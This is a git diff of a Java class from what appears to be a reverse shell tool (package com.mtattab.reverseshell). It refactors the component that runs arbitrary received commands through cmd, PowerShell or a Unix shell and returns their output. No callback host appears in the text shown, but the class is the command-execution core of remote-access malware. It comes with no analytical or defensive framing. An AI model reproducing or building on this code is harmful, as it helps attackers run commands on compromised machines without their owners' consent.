@@ -1,9 +1,9 @@
 package com.mtattab.reverseshell.service.commands;
 
-import com.mtattab.reverseshell.model.CommandRestOutput;
 import com.mtattab.reverseshell.service.Command;
 import com.mtattab.reverseshell.util.DataManipulationUtil;
-import com.mtattab.reverseshell.util.SystemCommandProxyUtil;
+import com.mtattab.reverseshell.util.SystemCommandUtil;
+import jakarta.annotation.Nullable;
 import lombok.Cleanup;
 
 import java.io.*;
@@ -14,28 +14,33 @@ import java.util.concurrent.TimeUnit;
 public class SystemCommand implements Command {
     @Override
     public String executeCommand(String command) {
-        StringBuilder output = new StringBuilder();
-        runOsCommand(output, command);
+        String res =  runOsCommand( command, null);
 
-        return output.toString() ;
+        return res ;
     }
 
-    private static void runOsCommand(StringBuilder output,String command){
-        output.append("Running in: " + SystemCommandProxyUtil.currentWorkingDir);
+    public static String runOsCommand( String command, @Nullable File currentWorkingDir){
+        StringBuilder output = new StringBuilder();
+        File currentDir = SystemCommandUtil.currentWorkingDir;
+        if (currentWorkingDir!=null) {
+            currentDir = currentWorkingDir;
+        }
+
+        output.append("Running in: " + currentDir);
         output.append("\n");
         output.append("Command: " + command);
         output.append("\n");
 
         try {
             ProcessBuilder builder = new ProcessBuilder();
-            builder.directory(SystemCommandProxyUtil.currentWorkingDir);
+            builder.directory(currentDir);
 
             checkOSForCommand(builder,command);
 
             Process process = builder.start();
 
-            @Cleanup
-            OutputStream outputStream = process.getOutputStream();
+//            @Cleanup
+//            OutputStream outputStream = process.getOutputStream();
 
             @Cleanup
             InputStream inputStream = process.getInputStream();
@@ -58,13 +63,15 @@ public class SystemCommand implements Command {
             }
 
         }catch (Exception e){
+            output.append("exception occured with command: "+e.getMessage());
             e.printStackTrace();
         }
+        return output.toString();
     }
     private static void checkOSForCommand( ProcessBuilder builder, String command){
         List<String> commands = new ArrayList<>();
 
-        if(SystemCommandProxyUtil.isWindows) {
+        if(SystemCommandUtil.isWindows) {
             setWindowPrompt(commands);
         }else {
             // Use a Unix shell to run the command on non-Windows systems
@@ -77,7 +84,7 @@ public class SystemCommand implements Command {
         builder.command(commands);
     }
     private static void setWindowPrompt(List<String> commands){
-        if (SystemCommandProxyUtil.runPowerShell){
+        if (SystemCommandUtil.runPowerShell){
             commands.add("powershell");
             commands.add("-Command");
         }else {
